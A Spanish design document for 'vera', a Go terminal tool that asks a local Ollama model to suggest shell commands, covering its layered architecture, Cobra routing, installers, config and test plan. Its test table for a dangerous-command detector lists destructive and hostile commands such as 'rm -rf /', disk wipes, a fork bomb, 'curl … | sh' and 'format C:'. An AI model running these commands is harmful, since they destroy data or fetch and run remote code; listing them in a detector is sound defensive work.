# Arquitectura de **vera**

> **Implementado** (13-nov-2026). Todas las decisiones están cerradas (✅); resumen en la sección 12.
> Los pequeños cambios respecto a este diseño que surgieron al implementarlo están en la sección 13.
> La sección 0 describe el código **anterior** a la migración (se conserva como referencia).

Herramienta de terminal en Go que usa Ollama (local) para proponer comandos a partir de una descripción en lenguaje natural. Funciona en macOS, Linux y Windows.

```bash
vera <descripción>        # o: ia <descripción>  (mismo binario)
vera ollama [modelo]      # instala Ollama y el modelo si faltan, y lo deja por defecto
vera config               # menú: modelo, confirmar descargas, arranque, borrar modelos
```

---

## 0. Punto de partida: qué hay hoy

Hoy todo vive en `package main`, en la raíz:

| Archivo | Qué contiene |
|---|---|
| `main.go` | Configuración (modelo, host), detección de SO/shell, prompt, cliente de `/api/chat`, limpieza de la respuesta, colores, preguntas `[s/N]`, ejecución del comando, `main()` con el enrutado a mano |
| `setup.go` | Barra de progreso, descargas, instalación de Ollama por SO, arranque del servidor, `ensureOllama`, pull de modelos |
| `models.go` | Tamaño de modelos (registro de Ollama), `ensureModel`, listar/borrar modelos, comando `vera ollama` |
| `config.go` | `config.json`, arranque al iniciar sesión (systemd de usuario), menú `vera config` |
| `color_*.go`, `detach_*.go` | Lo poco que ya está separado por SO con build tags |

**Funciona y está probado a mano**, pero no tiene ni un test, y cualquier cambio toca un archivo que lo hace todo. El objetivo de esta arquitectura es separarlo en piezas probables **sin perder nada de lo que ya hace**:

- instalación de Ollama sin sudo ni dependencias (descarga directa con barra de progreso);
- arranque automático de Ollama si está cerrado; ofrecer instalarlo/descargar el modelo si falta;
- tamaño del modelo y confirmación antes de descargar; rechazo de modelos que no sirven para chat;
- Ctrl+C limpio durante descargas (borra temporales; el pull se reanuda);
- menú `vera config`; alias `ia`; variables `VERA_MODEL`, `VERA_SHELL`, `OLLAMA_HOST`, `NO_COLOR`.

---

## 1. Idea general: tres capas

```
┌─────────────────────────────────────────────────┐
│  CLI          → interpreta argumentos, pregunta  │  ← "qué ha pedido el usuario"
│                 al usuario ([s/N], menú)          │
├─────────────────────────────────────────────────┤
│  Servicios    → Suggester, setup.Manager          │  ← "qué hay que hacer"
├─────────────────────────────────────────────────┤
│  Adaptadores  → cliente HTTP de Ollama, registro, │  ← "cómo se habla con el mundo"
│                 config en disco, exec, SO         │
└─────────────────────────────────────────────────┘
```

**Regla:** cada capa solo conoce a la de debajo, a través de **interfaces**. Así se puede probar el `Suggester` sin Ollama, o la CLI sin red.

**Regla adaptada a vera:** las capas de servicio **nunca preguntan nada al usuario**. Devuelven errores con tipo (`ErrNotInstalled`, `ErrModelNotFound`…) y es la CLI la que decide si pregunta «¿Instalar Ollama ahora? [S/n]». Hoy esa mezcla está en `main()` y en `ensureModel`; separarla es lo que permite probar los flujos.

---

## 2. Estructura de carpetas

```
vera/
├── cmd/vera/main.go            # solo monta dependencias y ejecuta la CLI
├── internal/
│   ├── cli/
│   │   ├── root.go             # vera <descripción>: flujo completo (arrancar, ofrecer instalar, sugerir, confirmar, ejecutar)
│   │   ├── ollama.go           # vera ollama [modelo]
│   │   └── config.go           # vera config (el menú actual)
│   ├── suggest/
│   │   ├── suggester.go        # contexto + prompt + LLM + parseo
│   │   ├── prompt.go           # BuildPrompt(info, query)
│   │   ├── templates/system.tmpl   # prompt con go:embed (hoy está en systemPrompt())
│   │   ├── result.go           # Suggestion + validación
│   │   └── danger.go           # IsDangerous(cmd, shell)
│   ├── llm/
│   │   ├── provider.go         # interface Provider
│   │   ├── llmtest/fake.go
│   │   └── ollama/client.go    # /api/chat (hoy: ask() + reintento sin "think")
│   ├── setup/
│   │   ├── manager.go          # IsInstalled, Install, EnsureRunning, HasModel, Pull, List, Delete
│   │   ├── registry.go         # tamaño de un modelo antes de descargar (hoy: remoteSize/modelRef)
│   │   ├── download.go         # descarga a temporal con progreso y cancelación por contexto
│   │   ├── install_darwin.go   # Ollama-darwin.zip → /Applications (o ~/Applications)
│   │   ├── install_linux.go    # .tar.zst → ~/.local (zstd en Go, sin sudo)
│   │   ├── install_windows.go  # OllamaSetup.exe /VERYSILENT
│   │   ├── start_*.go          # cómo arrancar el servidor en cada SO (app, systemd, serve)
│   │   ├── autostart_linux.go  # servicio de usuario systemd (hoy en config.go)
│   │   ├── autostart_other.go  # macOS/Windows: "lo gestiona la app de Ollama"
│   │   └── setuptest/fake.go
│   ├── config/config.go        # Load/Save + prioridad env > archivo > defecto
│   ├── sysinfo/sysinfo.go      # SO, distro, arquitectura, shell (+ tipo), gestor de paquetes
│   └── ui/
│       ├── render.go           # pinta la sugerencia, avisos, errores
│       ├── prompt.go           # Confirm("[S/n]"), ReadLine, menú numerado
│       ├── progress.go         # barra de progreso (la actual)
│       ├── spinner.go          # nuevo: mientras el modelo piensa
│       └── term_{windows,other}.go   # colores ANSI en Windows (hoy color_*.go)
├── build.sh  install.sh  install.ps1  README.md  ARQUITECTURA.md
└── go.mod
```

`internal/` impide que otros módulos importen estos paquetes: es la «tripa privada» de la herramienta.

### De dónde sale cada cosa

| Hoy | Pasa a |
|---|---|
| `defaultModel`, `model`, `ollamaURL`, `config.json` | `config` |
| `detectShell`, `osName`, pistas por SO de `systemPrompt` | `sysinfo` (+ la plantilla del prompt en `suggest`) |
| `ask`, `chatRequest`, reintento sin `think`, `num_predict` | `llm/ollama` |
| `cleanCommand` | `suggest` (solo como plan B si el JSON falla, ver §5) |
| `findOllama`, `install*`, `startOllama`, `ensureOllama`, `waitUp` | `setup` |
| `modelInfo`, `canChat`, `pullModel`, `listModels`, `deleteModel` | `setup` |
| `remoteSize`, `modelRef`, `sizeText` | `setup/registry.go` |
| `download`, `extractTarZst` | `setup/download.go`, `setup/install_linux.go` |
| `progressBar`, `color`, `confirm`, `readLine`, `fail` | `ui` |
| `runSetup`, `runConfig`, flujo de `main()` | `cli` |
| `onInterrupt` | desaparece: se sustituye por `context` + `signal.NotifyContext` (§8) |
| `detach_*.go`, `color_*.go` | `setup/proc_*.go`, `ui/term_*.go` |

---

## 3. Un binario, dos nombres (`ia` y `vera`) ✅ ya está así

- macOS/Linux: `install.sh` crea el enlace `~/.local/bin/ia → vera`.
- Windows: `install.ps1` copia `vera.exe` como `ia.exe`. (Mejor que un `ia.cmd`: un `.cmd` reinterpreta caracteres como `&`, `|` o `%` del texto libre.)

Si se quiere que la ayuda muestre el nombre usado: `strings.TrimSuffix(filepath.Base(os.Args[0]), ".exe")`.

---

## 4. La CLI: el punto delicado

Dos tipos de entrada:

- `vera ollama llama3.2`, `vera config` → **subcomandos**
- `vera cómo veo los puertos abiertos` → **texto libre**

### ✅ Decisión 1 — Cobra

Se usa `github.com/spf13/cobra`. Cobra ejecuta el subcomando si la primera palabra coincide con uno; si no, ejecuta la raíz con todos los argumentos.

**Trampas de Cobra con texto libre** (comprobadas en su documentación). Las tres se desactivan en `NewRootCmd` y cada una tiene su caso en el test de enrutado (§11.5):

1. **Raíz con subcomandos:** sin `Args: cobra.ArbitraryArgs` en la raíz, Cobra responde «unknown command» a cualquier texto libre.
2. **Palabras con guion:** `vera listar con ls -la` → Cobra intenta leer `-la` como opción y falla («unknown shorthand flag»). Solución: `root.Flags().SetInterspersed(false)`: deja de buscar opciones tras la primera palabra libre. (`vera --version` y `vera -h` siguen funcionando porque van delante.)
3. **Subcomandos automáticos:** Cobra añade `help` y `completion`. `vera help me a encontrar archivos` iría a la ayuda. Solución: `root.CompletionOptions.DisableDefaultCmd = true` y `root.SetHelpCommand(&cobra.Command{Hidden: true})` para que `help` deje de ser palabra reservada. (Si más adelante se quiere autocompletado de shell, se expone como `vera config` → opción, o con un flag `--completion zsh`, nunca como subcomando.)

Otros ajustes: `SilenceUsage: true` (no volcar la ayuda entera en cada error), `SilenceErrors: true` (los errores los pinta `ui`, en español) y `root.Version = version` para `--version`.

```go
// internal/cli/root.go
func NewRootCmd(d Deps) *cobra.Command {
    root := &cobra.Command{
        Use:           "vera <descripción>",
        Short:         "Comandos de terminal con IA local (Ollama)",
        Args:          cobra.ArbitraryArgs,                   // trampa 1
        Version:       version,
        SilenceUsage:  true,
        SilenceErrors: true,
        RunE: func(cmd *cobra.Command, args []string) error {
            if len(args) == 0 {
                return cmd.Help()
            }
            return runSuggest(cmd.Context(), d, strings.Join(args, " "))
        },
    }
    root.Flags().SetInterspersed(false)                        // trampa 2
    root.CompletionOptions.DisableDefaultCmd = true            // trampa 3
    root.SetHelpCommand(&cobra.Command{Hidden: true})
    root.AddCommand(newOllamaCmd(d), newConfigCmd(d))
    return root
}
```

### ✅ Decisión 2 — `vera ollama` con varias palabras = texto libre

`vera ollama no me arranca, cómo lo reinicio` se le pregunta al modelo, como hoy (en vez del error que proponía el diseño original).

Cómo se hace con Cobra: antes de `root.SetArgs`, una función `preRoute(args)` mira si la primera palabra es un subcomando y le sobran palabras (`ollama` admite como mucho 1; `config`, ninguna). Si es así, antepone `--`, y Cobra ya no lo trata como subcomando: todo llega a la raíz como texto libre. Los subcomandos llevan además `Args: cobra.MaximumNArgs(1)` / `cobra.NoArgs` como segunda barrera.

```go
// internal/cli/route.go
var maxArgs = map[string]int{"ollama": 1, "config": 0}

func preRoute(args []string) []string {
    if len(args) > 0 {
        if n, ok := maxArgs[args[0]]; ok && len(args)-1 > n && !isHelpFlag(args[1]) {
            return append([]string{"--"}, args...)
        }
    }
    return args
}
```

El escape `--` también lo puede escribir el usuario, para el único caso que sigue siendo ambiguo: una petición de **una sola palabra** igual a un subcomando (`vera -- config` le pregunta al modelo por «config» en vez de abrir el menú). Se documenta en la ayuda.

Reglas de enrutado resultantes:

| Entrada | Acción |
|---|---|
| (nada), `-h`, `--help` | ayuda |
| `-v`, `--version` | versión |
| `--` … | texto libre con lo que va detrás |
| `ollama` / `ollama <modelo>` / `ollama -h` | subcomando ollama |
| `ollama` + 2 o más palabras | texto libre |
| `config` (sola) | menú |
| `config` + más palabras | texto libre |
| cualquier otra cosa | texto libre |

---

## 5. Interfaces y tipos clave

### Proveedor del modelo

```go
// internal/llm/provider.go
type Request struct {
    Model       string
    System      string
    Prompt      string
    Schema      any     // JSON schema → campo "format" de Ollama
    Temperature float64
    MaxTokens   int     // hoy num_predict = 1024: sin límite, algunos modelos pequeños no paran
}

type Provider interface {
    Generate(ctx context.Context, req Request) (string, error)
}

var ErrModelNotFound = errors.New("modelo no encontrado")  // el cliente traduce el 404 de Ollama
var ErrUnreachable   = errors.New("Ollama no responde")
var ErrNotChat       = errors.New("el modelo no sirve para conversar")
```

El cliente de Ollama se encarga de detalles que hoy están en `main.go`: mandar `think:false` y reintentar sin él si el modelo no lo soporta, distinguir *timeout* de *no conecta*, y el límite de tokens.

### Gestor de Ollama

```go
// internal/setup/manager.go
type Manager interface {
    IsInstalled() bool
    Install(ctx context.Context, p func(Progress)) error
    EnsureRunning(ctx context.Context) error            // arranca si está cerrado; ErrNotInstalled si no existe
    ModelInfo(ctx context.Context, m string) (ModelInfo, error)   // existe + capacidades (chat/embeddings)
    RemoteSize(ctx context.Context, m string) (int64, error)      // ErrModelNotFound si no existe en el registro
    Pull(ctx context.Context, m string, p func(Progress)) error
    List(ctx context.Context) ([]Model, error)
    Delete(ctx context.Context, m string) error
}
```

Es más grande que en la propuesta original porque vera ya hace más (tamaño, capacidades, listar y borrar). Cada consumidor declara **solo lo que usa** (§11.4).

### Resultado de una sugerencia

```go
// internal/suggest/result.go
type Suggestion struct {
    Command     string `json:"command"`
    Explanation string `json:"explanation"`
    Dangerous   bool   `json:"dangerous"`
    Reason      string `json:"-"` // motivo del peligro (lo rellena IsDangerous, no el modelo)
}
```

### ✅ Decisión 3 — Salida JSON; se muestra comando + explicación

Hoy se pide «solo el comando en una línea» y se limpia la respuesta con `cleanCommand`. Pasa a pedirse **JSON con esquema** (campo `format` de Ollama), más fiable.

- Se muestran el **comando** y una **explicación corta** (una línea).
- El esquema **no incluye `alternatives`**: menos texto que generar = más rápido. El campo se puede añadir más adelante sin romper nada.
- `cleanCommand` se queda como plan B si un modelo devuelve JSON roto.
- La explicación se pide en el idioma de la petición (en la plantilla del prompt).

```go
type Suggestion struct {
    Command     string `json:"command"`
    Explanation string `json:"explanation"`
    Dangerous   bool   `json:"dangerous"`
}
```

Cómo se vería:

```
❯ lsof -i :3000
  Muestra qué proceso tiene abierto el puerto 3000.
¿Ejecutar? [s/N]
```

---

## 6. Flujo de `vera <descripción>`

```
cmd/vera/main.go
  └─ config.Load()                       env > config.json > valores por defecto
  └─ cli.Run(args)
       └─ route(args) → texto libre
       └─ manager.EnsureRunning()
            ├─ ok
            ├─ cerrado → lo arranca (app en macOS, systemd de usuario o `ollama serve`)
            └─ ErrNotInstalled → CLI pregunta «¿Instalar Ollama junto con <modelo> (5.6 GB)? [S/n]»
       └─ suggester.Suggest(query)
            ├─ sysinfo.Detect()          "Linux, Arch, zsh, pacman" / "Windows, PowerShell 7"
            ├─ BuildPrompt(info, query)
            ├─ provider.Generate()       POST /api/chat con format = schema
            ├─ json.Unmarshal → Suggestion   (plan B: cleanCommand)
            └─ validar: comando vacío → error; Dangerous = modelo || IsDangerous(cmd)
       └─ si ErrModelNotFound → CLI pregunta «No tienes <modelo> (5.6 GB). ¿Descargarlo? [S/n]» y reintenta
       └─ ui.Render(sugerencia)          peligroso → en rojo con aviso
       └─ ui.Confirm("¿Ejecutar? [s/N]")  (por defecto NO)
       └─ ejecutar con la shell detectada y devolver su código de salida
```

- **`sysinfo` es lo que más mejora la calidad.** Hoy ya se pasa SO y shell; falta **distro y gestor de paquetes** (en Arch no sugerir `apt`).
- **Seguridad: vera nunca ejecuta nada sin un «s» explícito.** Es lo que ya hace hoy.

### ✅ Decisión 4 — Comandos peligrosos: aviso en rojo, misma confirmación

Cuando `Dangerous` es cierto (`modelo || IsDangerous(cmd)`), el comando se pinta en rojo con un aviso, y se pregunta el `[s/N]` de siempre (por defecto **no**):

```
❯ rm -rf ~/proyecto
  Borra la carpeta proyecto y todo su contenido.
  ⚠ Comando peligroso: borra archivos sin posibilidad de recuperarlos.
¿Ejecutar? [s/N]
```

`IsDangerous` devuelve también el **motivo** (para el aviso), así que su firma es `IsDangerous(cmd, shellKind string) (bool, string)`.

`IsDangerous` debe cubrir también Windows (la propuesta original solo trae Linux): `Remove-Item -Recurse C:\`, `format C:`, `del /s /q`, `rd /s /q`, `diskpart`, etc.

### ✅ Decisión 5 — Copiar al portapapeles con la opción `c`

```
¿Ejecutar? [s/N/c=copiar] c
✓ Copiado al portapapeles
```

- Sin dependencias: `pbcopy` (macOS), `clip.exe` (Windows), y en Linux el primero que exista de `wl-copy`, `xclip -selection clipboard`, `xsel --clipboard`.
- Si no hay ninguno (p. ej. Linux por SSH sin entorno gráfico), la opción `c` no se ofrece: la pregunta vuelve a ser `[s/N]`.
- Vive en `ui/clipboard.go`, con el comando de copia inyectable para poder probarlo.
- En Windows, `clip.exe` interpreta la entrada en la página de códigos de la consola: hay que pasarle el texto en UTF-16 (o usar `Set-Clipboard` de PowerShell) para que no se rompan los acentos.

---

## 7. Flujo de `vera ollama [modelo]`

```
vera ollama [modelo]                      (sin modelo = el modelo actual)
  └─ ¿Ollama responde?        sí → seguir
  └─ ¿IsInstalled?            no → Install() con barra de progreso
  └─ EnsureRunning()
  └─ ModelInfo(modelo)        ¿descargado?
        no → RemoteSize() → «¿Descargar <modelo> (4.7 GB)? [S/n]» (si confirmar descargas = sí)
           → Pull() con barra de progreso (Ctrl+C = pausa; se reanuda al repetir)
  └─ ¿sirve para chat?        no → ofrecer borrarlo y terminar con error
  └─ config.Model = modelo; config.Save()
```

### ✅ Decisión 6 — Se mantiene la instalación actual

| SO | Cómo |
|---|---|
| Linux | Descarga `.tar.zst` oficial → `~/.local`, **sin sudo**, descompresión en Go |
| macOS | Descarga `Ollama-darwin.zip` → `/Applications` (o `~/Applications`) |
| Windows | `OllamaSetup.exe /VERYSILENT`, sin permisos de administrador |

Sin requisitos previos (ni Homebrew, ni winget, ni sudo) y con nuestra barra de progreso. Descartado el script oficial / brew / winget de la propuesta original.

Con build tags, un archivo por SO, pero **probable**: las URLs de descarga y la ejecución de comandos se inyectan (§11.7).

```go
//go:build linux

package setup

func (m *manager) install(ctx context.Context, p func(Progress)) error {
    file, err := m.download(ctx, m.baseURL+"/download/ollama-linux-"+runtime.GOARCH+".tar.zst", p)
    if err != nil {
        return err
    }
    defer os.Remove(file)
    return extractTarZst(file, filepath.Join(m.home, ".local"))
}
```

---

## 8. `main.go`: el único sitio que lo junta todo

```go
func main() {
    ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
    defer stop()

    cfg, err := config.Load(config.DefaultPath())
    if err != nil {
        ui.Fatal(err)
    }
    term     := ui.NewTerminal(os.Stdin, os.Stdout)        // colores, ¿es TTY?, preguntas
    provider := ollama.NewClient(cfg.Host)
    manager  := setup.NewManager(cfg.Host)
    sugg     := suggest.New(provider, sysinfo.Detect, cfg)

    os.Exit(cli.Run(ctx, os.Args[1:], cli.Deps{
        Suggester: sugg, Manager: manager, Config: cfg, UI: term,
    }))
}
```

**Inyección de dependencias manual:** nadie crea sus propias dependencias; todas llegan desde fuera. En un test: `suggest.New(fakeProvider, ...)`.

**Ctrl+C con `context`:** `signal.NotifyContext` sustituye al `onInterrupt` actual. Las descargas reciben `ctx`, y al cancelarse borran su temporal. Ojo: mientras se ejecuta el comando del usuario, Ctrl+C debe llegarle al comando, no a vera (vera solo espera a que termine). Se resuelve no cancelando nada en esa fase.

---

## 9. Configuración

### ✅ Decisión 7 — Se sigue con JSON (`config.json`)

Sin dependencias y sin migración: el `config.json` que ya tienen los usuarios sigue valiendo. Se edita con `vera config`. Los campos nuevos (`host`, `temperature`) son opcionales: si faltan, se usa el valor por defecto.

Campos (✅ prioridad: variable de entorno > archivo > valor por defecto):

```json
{
  "model": "qwen3.5:9b-mlx",
  "host": "http://127.0.0.1:11434",
  "temperature": 0.1,
  "confirm_downloads": true
}
```

| Campo | Variable que lo sobrescribe | Por defecto |
|---|---|---|
| `model` | `VERA_MODEL` | `qwen3.5:9b-mlx` (Mac Apple Silicon) / `qwen3.5:9b` |
| `host` | `OLLAMA_HOST` | `http://127.0.0.1:11434` |
| `temperature` | — | `0.1` |
| `confirm_downloads` | — | `true` |
| (shell) | `VERA_SHELL` | `$SHELL` / PowerShell |

Ubicación: `os.UserConfigDir()/vera/` → `~/Library/Application Support/vera` (macOS), `~/.config/vera` (Linux), `%AppData%\vera` (Windows).

---

## 10. Orden de migración

Después de cada paso **la herramienta funciona igual que antes** y el paso queda cerrado con sus tests.

| Paso | Paquete | Qué hacer |
|---|---|---|
| 0 | — | `git init` + `.gitignore` (`dist/`, `cover.out`) + commit del estado actual. Solo local. (✅ Decisión 8) |
| 1 | `config` | Mover `config.json`, prioridad env/archivo/defecto. Tests con `t.TempDir()`. |
| 2 | `ui` | Mover colores, barra de progreso, `Confirm`, `ReadLine`. Con `io.Reader/Writer` inyectados para poder probar preguntas. |
| 3 | `llm/ollama` | Mover `ask` + reintento `think` + timeout. Tests con `httptest`. |
| 4 | `setup` | Mover instalación, arranque, modelos, registro, autostart. Inyectar `lookPath`, `run`, URLs. Tests con `httptest` y fakes. |
| 5 | `sysinfo` | Mover detección de SO/shell; añadir distro y gestor de paquetes. |
| 6 | `suggest` | Extraer prompt (plantilla embebida), parseo y validación. **Cambio de comportamiento:** salida JSON (Decisión 3) e `IsDangerous`. |
| 7 | `cli` + `cmd/vera` | Enrutado (Decisión 1/2), flujos de `vera`, `vera ollama`, `vera config`. `build.sh` pasa a compilar `./cmd/vera`. |
| 8 | extras | Spinner, portapapeles, aviso de peligro (Decisiones 4 y 5). |

Pasos 1–5 y 7 son **solo mover código** (el usuario no nota nada). Los cambios visibles están concentrados en 6 y 8.

---

## 11. Testing

### 11.1 La pirámide

```
            ▲   pocos, lentos, necesitan Ollama de verdad
           ╱ ╲
          ╱E2E╲          go test -tags=integration
         ╱─────╲
        ╱ HTTP  ╲        httptest: un "Ollama falso" en memoria
       ╱ falso   ╲
      ╱───────────╲
     ╱  Unitarios  ╲     fakes de interfaces, tablas de casos
    ╱───────────────╲    muchos, rápidos (ms), sin red
```

Todo lo que sale del proceso (red, disco, `exec`, variables de entorno, stdin/stdout) va detrás de una interfaz o una función inyectada.

### 11.2 Dónde viven

Junto al código, en `_test.go`. `testdata/` para JSONs de ejemplo y golden files. Fakes reutilizables en `llm/llmtest` y `setup/setuptest` (misma convención que `net/http/httptest`).

- `package x_test` (caja negra) por defecto.
- `package x` (caja blanca) cuando hay que tocar algo interno (p. ej. `detect` en `sysinfo`, funciones inyectadas en `setup`).

### 11.3 Qué probar en cada paquete

| Paquete | Qué probar | Técnica |
|---|---|---|
| `config` | Guardar/cargar, defectos sin archivo, archivo corrupto, **prioridad de variables de entorno** | `t.TempDir()`, `t.Setenv` |
| `ui` | Barra (100 % solo al terminar, sin TTY solo línea final), `Confirm` con Enter/EOF/«s»/«n» | `bytes.Buffer`, `strings.Reader` |
| `llm/ollama` | Ruta y cuerpo (`model`, `stream:false`, `format`, `num_predict`), parseo, 404 → `ErrModelNotFound`, reintento sin `think`, timeout ≠ no conecta | `httptest.NewServer` |
| `setup` | `IsInstalled`, rutas candidatas por SO, `EnsureRunning` (arranca/espera), progreso del `Pull` (NDJSON), errores del pull (nombre inválido, no existe, sin espacio), `RemoteSize` (200/404/error), `extractTarZst` (incl. ruta maliciosa `../`) | `httptest`, `lookPath`/`run` inyectados, `t.TempDir()` |
| `sysinfo` | Shell, distro y gestor de paquetes (arch→pacman, ubuntu→apt, fedora→dnf), Windows con PowerShell/cmd | `getenv`/`readFile` inyectados |
| `suggest` | JSON válido/roto/vacío, plan B `cleanCommand`, que el prompt lleve el contexto, `IsDangerous` (Linux **y** Windows) | Fake `Provider`, tablas, golden file |
| `cli` | Enrutado (tabla de §4), flujos: Ollama cerrado → arranca; no instalado + «s» → instala y descarga; «n» → sale sin tocar nada; modelo de embeddings → ofrece borrar | Fakes de `Manager`/`Suggester` + stdin simulado |

### 11.4 Interfaces pequeñas en el consumidor

```go
// internal/cli/root.go — la CLI solo declara lo que usa
type suggester interface {
    Suggest(ctx context.Context, query string) (suggest.Suggestion, error)
}
type ollamaRunner interface {
    EnsureRunning(ctx context.Context) error
    Install(ctx context.Context, p func(setup.Progress)) error
}
```

*Accept interfaces, return structs*: el `setup.Manager` real las cumple sin hacer nada; los fakes de los tests solo implementan uno o dos métodos.

### 11.5 Tests de tabla (ejemplos clave)

**Enrutado** — el test más importante de la CLI. Con Cobra se inyectan los argumentos con `root.SetArgs` y fakes de `Suggester`/`Manager`. Cada trampa de §4 tiene su caso: si una actualización de Cobra cambia el comportamiento, este test avisa antes que los usuarios.

```go
func TestRouting(t *testing.T) {
    tests := []struct {
        name      string
        args      []string
        wantQuery string // lo que llega al Suggester ("" = no se llamó)
        wantSetup string // modelo pedido a `vera ollama` ("-" = no se llamó)
    }{
        {"texto libre", []string{"ver", "puertos", "abiertos"}, "ver puertos abiertos", "-"},
        {"ollama sin modelo", []string{"ollama"}, "", ""},
        {"ollama con modelo", []string{"ollama", "llama3.2"}, "", "llama3.2"},
        {"escape --", []string{"--", "config"}, "config", "-"},
        {"trampa: guiones", []string{"listar", "con", "ls", "-la"}, "listar con ls -la", "-"},
        {"trampa: help", []string{"help", "me"}, "help me", "-"},
        {"trampa: completion", []string{"completion", "de", "zsh"}, "completion de zsh", "-"},
        {"ollama + varias palabras", []string{"ollama", "no", "arranca"}, "ollama no arranca", "-"},
        {"config + palabras", []string{"config", "de", "nginx"}, "config de nginx", "-"},
        {"ayuda de ollama", []string{"ollama", "--help"}, "", "-"},
    }
    // root := cli.NewRootCmd(deps con fakes); root.SetArgs(tt.args); root.ExecuteContext(ctx)
}
```

**Comandos peligrosos** — añadir el caso a la tabla **antes** de tocar `IsDangerous`:

```go
{"ls -la", "posix", false},
{"rm -rf /", "posix", true},
{"sudo rm -rf /*", "posix", true},
{"dd if=/dev/zero of=/dev/sda", "posix", true},
{"mkfs.ext4 /dev/sdb1", "posix", true},
{":(){ :|:& };:", "posix", true},
{"curl http://x.sh | sh", "posix", true},
{"Remove-Item -Recurse -Force C:\\", "powershell", true},
{"format C:", "cmd", true},
{"Get-ChildItem", "powershell", false},
```

### 11.6 Cliente de Ollama con `httptest`

`httptest.NewServer` levanta un servidor real en un puerto aleatorio; el cliente recibe `srv.URL` como host. Dentro del handler, `t.Errorf` (nunca `t.Fatalf`: corre en otra goroutine).

### 11.7 `setup` sin instalar nada

El `manager` no llama directamente a `exec.LookPath`, `exec.Command` ni a URLs fijas:

```go
type manager struct {
    host     string
    baseURL  string                          // "https://ollama.com"; en tests, srv.URL
    registry string                          // "https://registry.ollama.ai"
    home     string
    http     *http.Client
    lookPath func(string) (string, error)
    run      func(ctx context.Context, name string, args ...string) error
}
```

Así se prueba la instalación entera contra un servidor falso que sirve un `.tar.zst` pequeño de `testdata/`, extrayendo en `t.TempDir()`.

### 11.8 Golden file del prompt

`go test ./internal/suggest -update` regenera `testdata/prompt_*.golden`; si el prompt cambia sin querer, el test falla y enseña la diferencia. (Revisar el cambio con `git diff` requiere git → Decisión 8.)

### 11.9 Integración con Ollama real

Con `//go:build integration`; no se compilan en `go test ./...`. Se saltan (`t.Skip`) si Ollama no está. **Probar propiedades, no texto exacto** («contiene `ls`», «no es peligroso», «JSON válido») y `Temperature: 0`. Modelo configurable con `VERA_TEST_MODEL` (por defecto uno pequeño, p. ej. `qwen3:0.6b`).

### 11.10 Comandos

```bash
go test ./...                         # rápidos
go test -race ./...
go test -cover ./...
go test ./internal/suggest -update    # regenerar golden files
go test -tags=integration ./...       # con Ollama real
```

Se añadirían como `./build.sh test`, `./build.sh cover`, `./build.sh integration` (sin `make`, que no viene en Windows).

### 11.11 Objetivos de cobertura orientativos

| Paquete | Objetivo |
|---|---|
| `suggest` | 90 %+ (parseo, validación, seguridad) |
| `cli` | 80 %+ (enrutado y flujos) |
| `config`, `sysinfo`, `ui` | 80 %+ |
| `llm/ollama`, `setup` | 70 %+ (parte es pegamento con SO/red) |
| `cmd/vera` | lo que salga |

---

## 12. Decisiones (resumen)

| # | Decisión | Elegido |
|---|---|---|
| 1 | CLI | ✅ Cobra, con las tres trampas desactivadas (§4) |
| 2 | `vera ollama` + varias palabras | ✅ Texto libre (como hoy) + escape `--` |
| 3 | Salida del modelo | ✅ JSON con esquema; se muestra comando + explicación corta |
| 4 | Comandos peligrosos | ✅ Aviso en rojo con motivo + `[s/N]` normal |
| 5 | Portapapeles | ✅ Opción `c` (si hay herramienta de copia en el sistema) |
| 6 | Instalación de Ollama | ✅ La actual (descarga directa, sin sudo ni requisitos) |
| 7 | Formato de configuración | ✅ JSON (`config.json`, sin migración) |
| 8 | Control de versiones | ✅ `git init` local + commit antes del paso 1 |

Dependencias nuevas: solo `github.com/spf13/cobra` (y `spf13/pflag`, que trae). Se mantiene `klauspost/compress` para el `.tar.zst` de Linux.

---

## 13. Implementación: cambios respecto al diseño

Lo implementado sigue este documento. Estos son los ajustes que surgieron al escribir el código:

| Diseño | Implementado | Por qué |
|---|---|---|
| `setup.Manager` como interfaz en `setup/manager.go` (§5) | `setup.Manager` es un **struct**; la interfaz la declara quien la usa (`cli.Manager`) | *Accept interfaces, return structs* (§11.4). `cmd/vera/main.go` comprueba en compilación que el struct real y el fake la cumplen. |
| `Install(ctx, p) error` | `Install(ctx, p) (string, error)`: devuelve dónde quedó instalado | Para el mensaje «✓ Ollama instalado en …». |
| `EnsureRunning` arranca si hace falta | Además se exponen `Running` y `Start` por separado | La CLI necesita escribir «Arrancando Ollama…» *antes* de arrancarlo, y la capa de servicio no escribe en la terminal. |
| `AutostartState()` / `SetAutostart(on)` | Reciben `ctx` | Ejecutan `systemctl`; así se pueden cancelar. |
| `BuildPrompt(info, query)` | `BuildPrompt(info)` (prompt de sistema); la petición va aparte como mensaje del usuario | El golden file no depende de la petición. |
| `Suggestion.Alternatives` | No existe | Decisión 3 (menos texto = más rápido). |
| — | `ui.Terminal` con preguntas cancelables | Con `signal.NotifyContext`, una pregunta `[s/N]` bloqueada en la lectura no se enteraría del Ctrl+C. La lectura va en una goroutine y la pregunta deja de esperar al cancelarse el contexto. |
| — | Errores de Cobra traducidos | «unknown flag» se convierte en «Opción desconocida… escríbelo después de `--`». |
| Tests de `ui` «lo que salga» | `ui` al 83 % | Barra, preguntas, spinner y portapapeles tienen lógica que merece test. |

### Fallos que encontraron los tests durante la migración

- **`IsDangerous` no detectaba `rm -rf`** (sí `rm -r`): el patrón exigía un límite de palabra justo después de la `r`. Lo cazó la tabla de §11.5.
- **Variable tapada en `runSuggest`**: tras descargar un modelo que faltaba, el reintento guardaba su resultado en un `err` interno (`:=`) y vera seguía diciendo «no tienes el modelo». Lo cazó `TestModeloQueFaltaAceptar`.
- **La explicación salía en inglés** con peticiones en español: lo detectó el test de integración y se reforzó la regla en la plantilla del prompt.

### Cómo se verificó

- `./build.sh test` en macOS y, compilados para Linux, en un contenedor Ubuntu (incluye los tests solo-Linux: instalación en `~/.local`, servicio de usuario de systemd).
- `./build.sh integration` contra Ollama real (`qwen3.5:9b-mlx`).
- Prueba manual con el binario nuevo en macOS (petición, peligro, copiar, ejecutar, enrutado, `vera ollama`, `vera config`, Ollama cerrado, Ctrl+C a mitad de descarga y reanudación) y en un Ubuntu limpio (sin Ollama → instalar desde una petición normal → responder; Ollama cerrado → arranque automático).
- **Sin probar en Windows** (solo compila y pasa `go vet`).

Cobertura al terminar: `suggest` 98 %, `sysinfo` 92 %, `llm/ollama` 92 %, `config` 84 %, `ui` 83 %, `cli` 80 %, `setup` 79 %.
